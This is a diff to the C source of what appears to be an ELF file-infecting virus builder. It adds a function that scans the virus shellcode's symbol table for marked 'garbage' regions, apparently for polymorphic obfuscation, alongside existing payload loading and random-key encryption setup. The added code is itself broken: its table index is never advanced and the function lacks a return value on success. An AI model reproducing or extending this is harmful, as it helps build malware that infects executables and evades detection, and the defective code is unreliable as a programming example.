@@ -2,6 +2,7 @@
 #include "lib/infect.h"
 #include "lib/elf64.h"
 #include "virus_shellcode.h"
+#include "virus_table.h"
 
 char key[16];
 
@@ -39,6 +40,46 @@ int get_virus_info(char **v, size_t *l, size_t *c_off, size_t *c_len){
 	return TRUE;
 }
 
+#define GB_START ".garb_start"
+#define GB_END ".garb_end"
+
+int set_garbage_infos(){
+	char **names = NULL;
+	
+	int64_t off_gt_len;
+	elf_off_symbol(virus_shellcode, virus_shellcode_len, "garbage_table_len", &off_gt_len);
+ 	uint32_t gt_len = ((uint32_t *)((char *)(virus_shellcode + off_gt_len)))[0];
+	
+	int64_t off_gt;
+	elf_off_symbol(virus_shellcode, virus_shellcode_len, "garbage_table", &off_gt);
+	Garbage *gt = ((Garbage *)((char *)(virus_shellcode + off_gt)));
+
+    Elf64_Shdr *symtab = NULL;
+    Elf64_Shdr *strtab = NULL;
+
+	if (!elf_get_tabs(virus_shellcode, virus_shellcode_len, &symtab, &strtab))
+		return FALSE;
+
+    Elf64_Sym *sym = (void*)(((char*)virus_shellcode) + symtab->sh_offset);
+    char *strs = ((char*)virus_shellcode) + strtab->sh_offset;
+
+	uint32_t x = 0;
+	uint32_t n = (symtab->sh_size / sizeof(Elf64_Sym));
+    for (size_t i = 0; i < n; i++) {
+        //println(strs + sym[i].st_name);
+		//WARNING: this algo may not work on other the linker
+        if (startswith(strs + sym[i].st_name, GB_START)){
+			if (!(i+1 < n && startswith(strs + sym[i+1].st_name, GB_END) &&
+				str_equal(strs + sym[i].st_name + slen(GB_START),
+							 strs + sym[i+1].st_name + slen(GB_END))))
+				return FALSE;
+			gt[x] = (Garbage){sym[i].st_value, sym[i+1].st_value-sym[i].st_value};
+			//skip next
+			i += 1;
+        }
+    }
+}
+
 int main(int ac, char **av){
 	(void)ac;
 	(void)av;
@@ -48,6 +89,7 @@ int main(int ac, char **av){
 	size_t crypt_off;
 	size_t crypt_len;
 	struct s_opt opt = {FALSE, FALSE, FALSE};
+	set_garbage_infos();
 	if (get_virus_info(&virus, &virus_len, &crypt_off, &crypt_len) == FALSE)
 		return 1;
 	randomize(key);
